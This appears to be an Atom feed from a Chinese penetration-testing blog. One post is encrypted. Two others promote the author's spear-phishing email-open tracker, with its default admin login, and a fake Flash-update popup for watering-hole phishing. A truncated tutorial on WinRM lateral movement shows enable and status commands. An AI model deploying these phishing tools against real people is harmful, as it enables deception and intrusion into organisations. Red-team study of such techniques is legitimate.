<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Se7en&#39;s Blog|资深apt install专家。</title>
  
  
  <link href="https://www.se7ensec.cn/atom.xml" rel="self"/>
  
  <link href="https://www.se7ensec.cn/"/>
  <updated>2020-11-17T16:54:15.245Z</updated>
  <id>https://www.se7ensec.cn/</id>
  
  <author>
    <name>Se7en</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一星期实战总结（四）</title>
    <link href="https://www.se7ensec.cn/2020/11/17/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%934/"/>
    <id>https://www.se7ensec.cn/2020/11/17/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%934/</id>
    <published>2020-11-17T02:30:24.000Z</published>
    <updated>2020-11-17T16:54:15.245Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="c447258812d2890b997d3ab1af669d1ebd6169b10f5acecdc971d54c5ce144d6">79368b25fc99414eb5e6dd35b8823418ba9f2b00aaf622961808809d1588f3fb4d5201407f02b9e2c3d007f1b7bf65977da4dd88e5240cef21dd34abb8fae99f0a8d9d28711e46239440271eb8061870b69e54f553aac97172c643e36c05dede807be2f5915d1b3b2feae3a562b3f2800638d51031f6d854527c33ddc6826346bc5b81a3cd8125e794b23758fce2b899d40584d3c6894da116de3d76adb605717bd0ef6280430261869d0bd38b4a11ed62d782f73b99b51a91172b0db846fbf093d55d78a2fe80708d1d351b440dca8b74992a40fc595001902f5f0aed0f91ce3c0c7daed0b41b5cec976327bbcf17bbbe420d5d8c775007fbdac30c9fccaa71b728d1fe846556599a3872a617f715b00330c078ad9c0ebe7d04d181411e3809ad81a89dcc911f5e97a384b2dcc10221d28bbc166a865b96c803b8696c11e196e26c1e41659fc2f1ab69be90633a691492589db6e246282ed806f85fef381a62b5e50b3c84f97e429c92ef40dd10ff56a058a23ab32837f5f9c16dd233fb8e0ce4c74becd4d066b0119c4c8294382f205735f219c132049508d404dbf8265066008a1693301d629f61ea3f1c79b2c4d436c0d7333e399a2fb7e99a5a24006f36485d6e791295d6bd05132b00fc1818ec1e2ccf83d5ca3c3f5c4ff8b16829c1901ee851f1ecc96ea6b41f15c45efa4509c85d28cd2a63b2f0a33bee70d8026dd6143f04d56fbd3f0c62260567ad3717e758c76b5101ca7c5d2173b10910196f908bea7a2514e4b216cd97a7d23832d5173fe18591fbd942522fbe4b53386e16e88f88ec4531c32133668ec22b031ab06ad5bfa858a0dd063611a83a4bf2462000df624a1b4f7c577fd0b1c4d09a591dc336f7137614a2a23058fd654514dfc6c7a59cfb372c22c45dd2d9f716d3d75c2338216b27be966cc78032351d0589e64841b95558e56f910b7fed4ad05f0d7d9b8578b72b12fea70a59caeb5a1609b2b86d3796f8359601e976e32cdc6a76e020167621d700f46e25e3d27b94f920dca2d295e4f9d98e646ea23bcf0465fc13ae003dca20407e6ae6d7678fa3055be54c5dce11c2fd9bc9b67e1ea5cdc39971fae341fa247c461f183f68510a86859f346c0c6742eb969ace1c42ef35d0f103f160e697899f2b7746ae058eb6ead856831dd010f2d633f41abdfd7b8b519a89682a487480c5d92e179320a83a8a98de202996730f2be10dcd4ac8dda86c2ca286eef2a44b004cc3dafdc2e3d62dd24d886c271f588786f86aacd270ce23313fcfae8573ee4f0b99d01b07c47645c97f50372ffd19f8fcccf62639d4bdd6d68b6fd6ffa2a904f52f94ac8946e5520a6b32e2582ab0855ea949d9d2139d9d75f57cb8608a3e34cf0e02076e9fcafb809204c242d7232558e9ab76aad0afaf28630d41dcaa74ef1bb246a6da6ee632ee9c72e494b3507a736fc7857c9ce2442b8f4bdbf78045759cd12a9bca4ea37e133c42e1964e9546002f22b4b296882e81216f1f5e98a15955a75741489e62186349c5fdc2c5d66fc69bd94679a41fe02670cf9e0f7cce172f8c2ab8c1e83c5694348a5222b07fcd4abbab2ee1611d76e8120b29e04df51fa7321c073a3734c1b4d92489fa43e1f63bbc71a2ce66394b832731010939cb431679e8b69e1438d74818286ac4e419a47fcc51c004e0215e7fc8e41596a90caf08ac68056af8a89be530f394f4bf9eb8f1c7eaa3270c940131f0d1c1c246e0fa7652096c4e1e0170399c89681ac7889759e7ae5d2ea23e8c6bea9e40348f96de2f4cef321768216710ce6dc16385b8790ebc5e1732dab669c7cf7c2044e2f2a165287500d27ba419b985c223353ab4ed96cb2a561ada40e99b888edceffc2fcce477f587abf50b6b3f179e7b4e0e6764046b7e25c3d68bf4d26bb380adbc6ff67007f9f4bf8ba751d97c9996c5596f01af4c5aaff725b1b2e8aa273afdae8c8bb0e367106212d07ee6fd46545080571829f9dd55017045b9e0e6144d7c4d7a4a373813bc71a7c44e13e423dd4484cb372cc8fd7dead915d983211cd5968ea97155a0867a5143414e7e3c1c74ef27b2c0b06e4bafad90335e05f0506490cddf0cab1cb751952853a5e363676ef806161de628dbc709efb7521e9b031148346b76f114a1996a9606d58741c6b62989fa1b5fcad7e6cc413ae01b73c4ee17be8b009aa83c14af438acc886b4caab52866e8423782fca5334b14dd8ea4a3e818f6c27c4be9d2dc7e10d81e1d598ea4c2dc1bb8481cea5dbe369a3e870b7c65fffc6bf1866d2e3e513753c3e26e82f3edd2ec421de0a3f5b16e6b829b2a5105e0c3331c5c357c773e6ca0bbc82f14180a85f553372f15415014f531218cabe11f28469b07e224035b648428583978095376b8199e0c61ce54ecbc1da7a317334581cd6113dc02249c7a70009d2d542c131152e0dde7b7585a7c95f022506d9f81e901140053d3100519b4ccc27dbc68a4104420a0494cb6dbf0b32e70652991c2eaaad1670c028afa540cbc352a553630b129e80a7bad078c36b6ef860e7aa7c0f1df33381584a37d9fe6e00feff0c182701b1d115a9171d59e607e551fea2b664ee709adbb657eecbda66ddea78f08b0c2f8348804d774be8fd88a636bcce519fda957a4b1a387265228b1274b593ab1cf2dbd9f6af37eaaabe7d69b29d8854f5c30463a65c0641c331e16a83a8b05ff8d93990cd748d6bac41553261e572ee92ba1230e85d59e2971d78cd9d60bb54083b578406e6d6ffc044ea333f61b8856d9ed590f6152a564bf9f6fcb2772f594bd75fd9c1175c0f9dfb8d7ee748c9ae1f1d3a5e18889595d913579f1bd3c9511c2779d143b0cd061c5224b1d891016815fb49fb72363b2f4047c7ac5e608bb90ab4ec53301867aad19af6c22a4a95815935e7428747832d575cba7a0948b08a92ec4db6f115153327fb406a2b33aa91e049d5f66b7923d584468c3625e0040ba8214cbce86f42d92ece4811d2d11d5da78bbc56a067a9e444bb3624907119cd1a770f2b08d1633765b505c27214d0f2c91d156ed63883431fc3c6b88f690051deecc65d10ffa5b8e7ee383e9d3b05d4ff48fb85397ac9461ecdbee1a7e7293cebb07791ab4fa9366f317ea39dd778d81ef052d5e31fc81eeebd643914f656576a936b2ecbf58058af2b9e0835f4b03286cb7a5ac5554668bdb03fd689a163230f5e1f09064f679a9405b4dfe454247d64d82b3ca65fa0fa499b17372a7e9d75470a9cf1b3b0133eafb654744603505dfce8d82a5cabadb357d40a297149215b29cc79064918150b968b9719b89d204dc284429400d90323404133b58b8a603c6d7ab5af29ca3f10e42611bea30a7096fda2136130584019f158c62aa827b26a963648012c693ec8d088919f612d07851990d49ff3d264218acfb8eabe4632685de52c756813451de6752903cf35e5c96a5d2fe925d7b9dda1b1fa260e53c0c42a0250bbe0ab80a255a1943edefc6d5ea5b7441abda2eabcd6a533499f8d2677c7e7cf02e74add1d93f18c4f1365f5361fb9be6a416d48c35decd4b3b07b3357e071b3d79c1189562fed845a62d30023e14714295e897b712d188c611aeb1d61d682f107b2daf15e80eb72dede57a986a55b5f4ad763072a86ff0103cd2a81332f3cd0eafc69e3ea5c7f65c62b87e6ed77bf3ab31137f7ce961ae64368782d7c030cacd7ee6cce29331717884dfee2d16c53a5fda1d2576231899d6a66afb4cac13534251fc69055f08994fb62c04a8fcd875acc2583c993ea6e046fc127748910ad7fce45c87cbdcc540da6590e173178041e1c4acd6b1c7c0963a59f30fb700af9412ade0542a26d8b099ef2d2f7d1f3b2e48cffecd393554fe76182ccc3b64e7ec8fd8df797daaf30b98dc611feb881cd68590701d58f3181dc689f291bb335ed0fc38c6877d1a0d14874d6b90a6bbc159addd7b5f3c36ea9942599e72f759fd062dcb1217da07f910b7167b4e84f5b4fb1af22c708bc1de6b7294834e01de3f009a0b39a6d966a3cbc6e605644193ad28b3a73f564c8403f672eaa14322246c5e826524364607ac53d860e4e292c04ac829faf5c1a724c15fcac2415446b5bf6a2b7eeaaba62b72390ab4294d3b6b8bc1d2f57bf5e82ada465e8f184bd4af0efa7d08e7d0d829683e5ca53ceef0196f3ab5ec5f7b776e185b685cce9f84ec65282944927ed2c4ee0a6dbb48632be5c4c62e567a250f2206bcc60a96e8a4b9357eecef7566d352fbb98b018af1261912fd5a33fcca972ea345580ef6d22f6ff507244d6c642547645477b7e449adf99573a2088149d80c608f41f63d4002527bb40b137f431694817899afd7f00fc5893be58603a6293e1e1f0d1ead8a2e8d8fd190b517d7b4953d05cba6deed2442bab85a85205f644f6cb619a19ef1efc908dd8003558dec07c16c1cdd37ff13e96f409395eab7143c67a7d09ca140131de98d1ccb3047fff9cea3edb979d7044f6371546dfa990c6279b69a120d50db5eae04f375dcff57be72bb6de89342d215e5445705f72770c66e160a3157f4a58a747c262b9aaa33cbd3749f823abd513cbd35803e2174855f75ddebf8a9ee6c46cc54a7c5b489481c3243f194b8a9866b348bbe7b617c494a41dfedc47a858d35b7e318ccdebebe13db9609e7ee56c8b5f8b17971b13e559527e075c9f72cdd7e8abb62a48568acd4caa8eb0b5754763c5bda237363fb0320ca583ed366cb4e1f6da0745c987477049a0e401ce458878420d40a958c8f50e804464bf91921ab9c4a23be1998baedbc01742d4d02408d20965788cc50de0b6590a32cb4162275bf4ea32eea2c75b3da85e240ba6c335c60d49e08e16036bdd598e36dd3e9bed78d31c0d29da7f304ff65f46e87f1e6398d8c97644078d52371772438c92cd5a3724f23effe06e02572a377f9e3beedd6804dcd6dd95f8c7fb272c1cdfe1d5e860f35a491454e5e050058b230cfdb31c20aa850dbc7c4316194833be135b2a9e0ad6ac38363eeb9386ed64f117c101e0e3ea585ec0e346aa36f5707ea5c60d524f9ca072d8d0bc5d5d70331d99611d1d9e1fd38b7a60f63d4d691d574d23264a1c927de3a40ffd3daa76ccd86a4ba32c232cfb264aea7532db9a9cfdd2e4ce1983873d38550d01142cf300189a9fc39bcc20126c82c1b0003ecd2e42d730ff5b69187528dac7bf137c4039ff8a3ddebc5a35945b4fc6d94846d460f0a97058240a115b987756f88598912641d3bb8a7c8ef6cfff7f1bb5228f39fb9a1ddc7de24c9d39b74adcbe4e9ca3349d64cb544a60ed461898883907cca93c83090ea87232dfbae835d4eec6ceb311943f0f2a8c5f93b8523c92f3d14d35221ae5bc0a3e55b8a1802f7f445397917d8b9f15276441760c096d77c949ad979f740fdd94282a0bf5cc52626652869757e883429722babb5a52d297ad5785b34a68517c19453951998451c8ff4637b0485c6b73dca3870d799f6eea5c168a56e46bcb8a46a6725c4200247172cb1224bc3a289bcf1a059bf7f75c7b48bc16d12c6899d3f41d7305c40196011cb9a2f60ce0e5f93b50195d2881f82cfec210d93a96eed52d6b68412978b5d6de444bf44893f229280ca1219587e1536bf2c1db2bec5b5d65f80538d226bf9227b7a0ca1b91978c7059fcf4d070d8145a4f6519b65e713dd5c74bfd9021a6a9fc3eced802c0fbcf66f83fcd6c103e54879c2c6fce7655de89656d2ae941e9612a651c4dac09179d08e8cf5659b0b3cbcff242fb58a64e7def08e118ca2d6085f106710888624bc53952baed78b3c5f34391bcc7882d998920b3660780461c2ddc69e3fa65bc35e1e4430e3b8c3c4fa4318b306947ecbc20fc9285724ff220b71ee52ca868e37e9e8c02c92a16ebabd7afe15edb703e29910fb5d44c272833e90219cea21e6aa0cf3b685292ee73cc9740e05d94e6a71f2fce0c86381e4353f4cf60ad8361952f60e21e2145208e0c5e1abc2456a0e84d83efa72760c76e4225734e8c8e26a9d6d4b9fb6719de17c732b7ba8ac8988be4a421179b2fe7031eda13b30f535d5777c9189d0894cf67fce37ee2852897b6e4382bf0e5e7b62321e532eae7fc4971316a88524482f3b4f6b7a30a9dc8fc311127883cbaa1f8677e6f7ae9ce0003f86dae24b713e36763b92bd8b3f3ce57c87197c9bed65d09d0087c4ffeea578c5fbee0900c7207a4c72572db3473ae96501e572cd384409b8afed3a4e8b9029390f344580831ca3e8d1247a75730a0f0803e9b457f59c0a0f19ce64a05c97a1bbf526384e83dcc80c9416219366c5aec52cb71dfec1aad21920013b9198ac3f52c7e2802cf4031d49642ab5e5d66540c50f0489af662cc123e42b7b13f842c5d0fbe73c31351b11011ade70d02d1402b537bb1e7ace367df4ac242ab4ff1f763526a0f5ce0c968bac91f36c333a98c57e8ed23b4a10e43c48fef77d080f396a550af389152c9905d9a8a66c022a5a307104af865dc5692d9c8d6b8e7c2288d7c596c16374a74f0d6ffa6a4e87fe46fb3f8345ae36d646c5dcee06dd9a282141b0cb362ec8a4592a6e3b2babbbb53046925baf9554cc4ce620790e462279ddeebe6007c040e87c112877bc11a3f79523e5d6102cb3a1684d6db7e5937b0029ce152cd12f9f29b7b455aff6a28cf5917c39ddbe3528d73fc597e7dbe30d4665ecd9d49876da14326671b90f47f1d919615096fccc6a48238b001a838623cf9f75463f52787e9b81cd8c0a7f66f4ed1560306dd9541237dbb1c15b83d637a56c57100bce5133760b08949dd55945fd20c890116f03cbd9b6113425c27bbd7432ea6bc14c2500611ca0312ded400969b6f7482511962fbbcff4933dabd36d5abeb9a91e7ff3a99e75a6a4ce64f59e2210130493d60dc6bd14789c8ce98c079acbcafeec1288591f8a3fbb79cd4d95e5d24dbd2f729fec1241ab5ea4261f4dc7091bcda50958b77ace274eeec4d5f196918c5767b31aa5baa8f1406c54249edb40e6911972fdc713324097638d9de963bfa67ae23220145403350b7dcf87568f073b293f342538bbda7d5ea73595539acb928dfd007b013093a4874f55ffcb39bc1413ec7be8f2ad15152c744e1ee25b1b2aa623620aceec83e4975bc8af1d6de4e33684294b83ab314ab27f1c79d8baff4bdd436fa01c157008f8b6cdbf4b2787b1fea4167f0d8da34dacf05b21887029e5e58bb54cabb094194f863d41f707f0c24173ba09ca69d7983bac5654f7e548231cf53eb770d4f188d57ef08045c4b8db0e205087912d910e0a3ae8d4cf7ba404f194919b64bcb8f5565a009e2a6d05534d832792dacf0b1ff6c018aa08189d91b584a4637c6cdbbf5a779fd60899ba77917bbaf4b596df67b8d99edf540cff4f8be73eb3065c08e1ccde2f439f1424d7cecea961a2ed5b84169f87bb73a434a7a69242e11e25ab90df7bf47563694271e4f5c59d4b15bdc44c63230efdcab8fad8ff9854e5d6dd7687833b3b9c068b1785aae6dc6e963c6b6ca0de95e80c36a8b5412f38a70d9d8c704b4a435cf9760e69d028fab0ce08ef6204543277eea239b1e8bedf96cb5c527948f067477ce2d3de4a66df4c2f4ef5daf25678e6b9cbac068c74f2b5a9e2dac9697810c024c1fcf917dd388dd949a6ad88cef34d4c2d617d347740494d76647d23a220bbdc8a428ca97593ceb917ff2c5259efeb0f2cfb93d1f55955f7e924b2a8fe709a236616282b6d460844e99c589ddaf7433d9e4ba63fd0a7805e9fe47b68374e109db4faec6cc108a709719682b8e8bd9e81e3e8292b326a5aa6dfe47bed89647c995c151eb855b890917798beef43ec9b5a19ad0a3fcd7fb5a94b960a0bbcbc4aac5b0bd2bac86f93d3413647f8d856ed7122ca8f05b36e141199b6bfb3e3e617acf5fab3c0e081679f4a13be36dbacdb77b5a04a66bb443879cce1305a9eaacafd62f0e79c7bc88d562df8ae8660a9e8aea8d4cdde78cf0581addac206904bb561b5302f4ba82dd38883b03d4897f39b4f4ee2c12bc51b55cdc6910ad46e58c8539de03525434f8c9aae7253bb3077a14848ea07c53538d2c6aecce589e95a9b557581c05463c64fcee29f38ec2c829ac3059acf731ee672c830c5b935fa88b68d8be1e82e0618d0e3e61b0c3aaa435c97730927682417dc9e994e1570dbe80f94696c29d784e336ef7b1c3f45de4d643309b4707f4e2cea239032c6d07f3051084aef0f1d2b1ac1d0bdbaae267e1142662497d05f840c9d4299ced32de894064696ad0e9f90d69d40371f44104ca61181e7b4b075011a96397463c7f6eb3c7c53d4f8eea192e5ae5c37a97754d7e7c60c0c85dcdb2ce00a567a57963e29aa6d98db79c1d0936fed2f929aa761440d7cb6e94546b86939bfcf283971a9625c3e08a6842853578b51cfb958433facfa8e8296e0a1f1e24bdfedc683f63131a16fb8adea8a0c9190ca2a2bb6de1280421aeb5206f2299a2a839832852da792fececa4a4a8fcecfa24ebabd8fdb160d471835158207015f49f3d02992983e6af347b7a0c9047be313a3b4fde103435f86c2fc04122cbafb046aabba2b740b498ceaad1fe30c0ad0d9b346ff3b98a2b123800d08052aca9d3fa15e26c255f85ffc84671271943beade5efe28b16429f6001c9a3d2dac532968f926c042c7642050440a8bed490ce826c1dd75a8ebcf168bc66542e29fa3a1e8fb13894e07c9257cc9a5303e05d66f112143cdbe61ff87c445a15c0e48d991bcc883de85cb888f9a457b9224516de28b9ad485da54c5914a335e172ecdb8f0b0113b8c16ec7ddde80cc77fbe1727db311953352847b07c73795ace9182cfb69662062a48f4cd80ffeee5c0e4044eac44c85fb32bb0321f85f58ea7779db44a8d1b8426aae5919cba62517349f1125b67221cd1c1fe2d613007526ff177c7b340d3d9dff9fce3568d0100fe18c966e0eabba9a73a2fb2b64b9a1f4d02e8ecfcadb9f70ba800fa8af8ef44fc3164880ccc3d6ab19332054d0b72690eeefa1d1ada6d76afb3469b69c2e534db5434ae86bab28b6e89b9714e3e463590bf1c65f8d1ef972bdc9d3625dea50ea9fbaacfd03bf3fdab69b9839f26577c25141b005ca5449d4bfdf3553f1d7a7c777de49ee860eaaa0833add0bf6928819af1216dce9e79ac1d9e799e7eceff6a6f7e82ee4c1bb2ccd21f95d39dbbe91b589370f6acd11aff6bef3538c474cf29b400cff0fa0752e394861543f33866471274f0f1c49261789ac1381be3adcf22d2f1906c24b0b463726faee52710a3065864671679e3ae987026aca6446e199e8c9b4795e64a805de4d2751ad4cbe0d5419121d363773456e1c0d58d0d6a957417f18b9fef438bde1a35fa4a66fcad844418734fb53269a3983ee1b55cfaf58cbf9c87d3416fe7ce9e7809bc735e6be33cf611b746353de1cdf1b38946781630a63ef8b996aabd56a52f5ae30803a1208936b9aab53d</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="一星期实战总结" scheme="https://www.se7ensec.cn/tags/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>鱼叉攻击|Mail-Probe 邮箱探针后台管理系统</title>
    <link href="https://www.se7ensec.cn/2020/09/30/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Mail-Probe%E9%82%AE%E7%AE%B1%E6%8E%A2%E9%92%88%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
    <id>https://www.se7ensec.cn/2020/09/30/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Mail-Probe%E9%82%AE%E7%AE%B1%E6%8E%A2%E9%92%88%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</id>
    <published>2020-09-30T04:10:24.000Z</published>
    <updated>2020-11-14T19:54:03.459Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>好的鱼竿和诱饵固然重要，但真正把鱼儿和渔夫联系起来的是小小的浮漂。</p></blockquote><a id="more"></a><h1 id="效果预览"><a href="#效果预览" class="headerlink" title="效果预览"></a>效果预览</h1><p>平常去河边钓鱼，要使用浮漂才会知道这条河是否有鱼吃饵料，同理当邮件投递出去后，此探针可以判断目标是否点击了邮件，不至于那么的苦等。</p><h2 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h2><p><img src="https://raw.githubusercontent.com/r00tSe7en/Mail-Probe/master/tz0.png"></p><h2 id="信息查看"><a href="#信息查看" class="headerlink" title="信息查看"></a>信息查看</h2><p><img src="https://raw.githubusercontent.com/r00tSe7en/Mail-Probe/master/tz1.png"></p><h2 id="链接生成"><a href="#链接生成" class="headerlink" title="链接生成"></a>链接生成</h2><p>本程序通过php中的readfile() 函数读取本地图片，如使用自定义图片请替换public目录下的info.png，这里的图片可以使用目标公司的logo。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/Mail-Probe/master/tz2.png"></p><h1 id="配置相关"><a href="#配置相关" class="headerlink" title="配置相关"></a>配置相关</h1><blockquote><p>基于ThinkPHP 6开发</p></blockquote><blockquote><p>运行环境要求Apache和PHP7.1+</p></blockquote><blockquote><p>数据库文件为mail.sql</p></blockquote><p>数据库及其他配置修改env文件即可，默认为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">APP_DEBUG &#x3D; false</span><br><span class="line"></span><br><span class="line">[APP]</span><br><span class="line">DEFAULT_TIMEZONE &#x3D; Asia&#x2F;Shanghai</span><br><span class="line"></span><br><span class="line">[DATABASE]</span><br><span class="line">TYPE &#x3D; mysql</span><br><span class="line">HOSTNAME &#x3D; 127.0.0.1</span><br><span class="line">DATABASE &#x3D; mail</span><br><span class="line">USERNAME &#x3D; root</span><br><span class="line">PASSWORD &#x3D; root</span><br><span class="line">HOSTPORT &#x3D; 3306</span><br><span class="line">CHARSET &#x3D; utf8</span><br><span class="line">DEBUG &#x3D; false</span><br><span class="line"></span><br><span class="line">[LANG]</span><br><span class="line">default_lang &#x3D; zh-cn</span><br></pre></td></tr></table></figure><p>后台默认账号密码（密码修改直接替换库中MD5即可）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin|123456</span><br></pre></td></tr></table></figure><h1 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h1><a href="https://github.com/r00tSe7en/Mail-Probe">  <img align="center" src="https://github-readme-stats.vercel.app/api/pin/?username=r00tSe7en&theme=dracula&repo=Mail-Probe" /></a><h1 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h1><p><a href="https://github.com/c1y2m3">@c1y2m3</a> 分享的思路</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;好的鱼竿和诱饵固然重要，但真正把鱼儿和渔夫联系起来的是小小的浮漂。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="JavaScript" scheme="https://www.se7ensec.cn/tags/JavaScript/"/>
    
    <category term="PHP" scheme="https://www.se7ensec.cn/tags/PHP/"/>
    
    <category term="鱼叉攻击" scheme="https://www.se7ensec.cn/tags/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>水坑攻击|Flash钓鱼弹窗优化版</title>
    <link href="https://www.se7ensec.cn/2020/09/14/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB-Flash%E9%92%93%E9%B1%BC%E5%BC%B9%E7%AA%97%E4%BC%98%E5%8C%96%E7%89%88/"/>
    <id>https://www.se7ensec.cn/2020/09/14/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB-Flash%E9%92%93%E9%B1%BC%E5%BC%B9%E7%AA%97%E4%BC%98%E5%8C%96%E7%89%88/</id>
    <published>2020-09-14T04:10:24.000Z</published>
    <updated>2020-11-14T19:54:40.488Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>还是那句话：Flash永远滴神~</p></blockquote><a id="more"></a><p>一直想写个界面精致点的Flash钓鱼，奈何各种效果实现起来实在是有点麻烦，正好发现了layer这个牛逼的弹层组件，一开始直接用的图片，几行代码就搞定了，但是还是不够完美，后来发到T00ls大家集思广益，提出了一些非常好的建议，几次修改后才有了如下的最终版。</p><p>在线预览：<a href="http://flash-pop.se7ensec.cn/">http://flash-pop.se7ensec.cn/</a></p><p>有人说flash不好用了，感觉分析好对面是干啥的，做好一些自动化、定制化的工作，上线率其实还是挺高的。</p><p>项目地址：<a href="https://github.com/r00tSe7en/Flash-Pop">https://github.com/r00tSe7en/Flash-Pop</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;还是那句话：Flash永远滴神~&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="JavaScript" scheme="https://www.se7ensec.cn/tags/JavaScript/"/>
    
    <category term="HTML" scheme="https://www.se7ensec.cn/tags/HTML/"/>
    
    <category term="水坑攻击" scheme="https://www.se7ensec.cn/tags/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透|基于winRM的横向移动</title>
    <link href="https://www.se7ensec.cn/2020/08/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewinrm%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <id>https://www.se7ensec.cn/2020/08/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewinrm%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</id>
    <published>2020-08-26T14:10:24.000Z</published>
    <updated>2020-11-14T19:55:13.677Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>基于winRM的横向移动</p></blockquote><a id="more"></a><h2 id="winRM简介"><a href="#winRM简介" class="headerlink" title="winRM简介"></a>winRM简介</h2><p>WinRM(Windows Remote Management)是 Microsoft 对 WS-Management 协议的实现，WS-Management 协议即一种基于标准简单对象访问协议（soap）的防火墙友好协议，它让来自不同供应商的硬件和操作系统能够相互操作。windows 众多可以远程执行命令方式中的一种。 </p><p>作为DCOM和WMI远程管理的替代方法，WinRM用于通过WSMan与远程计算机建立会话，WSMan利用HTTP/S作为传输机制来传递XML格式的消息。在现代Windows系统中，WinRM HTTP通过TCP端口5985进行通信，而HTTPS（TLS）通过TCP端口5986进行通信。</p><p>WinRM本机支持NTLM和Kerberos（域）身份验证。初始身份验证后，WinRM会话将使用AES加密（<a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/winrmsecurity?view=powershell-7">Microsoft Docs</a>）保护。</p><p>注意：必须配置并运行WinRM服务才能接受远程连接。WinRM接受连接可能还需要几个步骤。请参阅这篇 <a href="https://pentestlab.blog/2018/05/15/lateral-movement-winrm/">Pentest Lab 文章</a> 以了解更多信息。</p><p><strong>※ winRM横向移动同时适用于工作组和域环境。</strong> </p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><h3 id="通信的双方都需要开启WinRM服务"><a href="#通信的双方都需要开启WinRM服务" class="headerlink" title="通信的双方都需要开启WinRM服务"></a>通信的双方都需要开启WinRM服务</h3><p>WinRS 适用于 Win server 2008 / Win7 及以后的系统，但是 Win server 2008 / PC 全版本系统默认关闭。</p><p>只有在Win server 2012 之后的版本的WinRM服务才默认启动并监听了5985端口，允许远程任意主机来管理。</p><p>WinRM状态查询</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> win32_service | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.name <span class="operator">-like</span> <span class="string">&quot;WinRM&quot;</span>&#125;                    </span><br><span class="line"></span><br><span class="line">ExitCode  : <span class="number">1077</span></span><br><span class="line">Name      : WinRM</span><br><span class="line">ProcessId : <span class="number">0</span></span><br><span class="line">StartMode : Manual</span><br><span class="line">State     : Stopped</span><br><span class="line">Status    : OK</span><br></pre></td></tr></table></figure><p>开启可以使用下面其中一条命令即可</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm quickconfig <span class="literal">-q</span> <span class="comment">#这条命令运行后会自动添加防火墙例外规则，放行5985端口。</span></span><br><span class="line"><span class="built_in">Enable-PSRemoting</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure><p>再次查询</p><figure class="highlight powershell"><table><tr><td 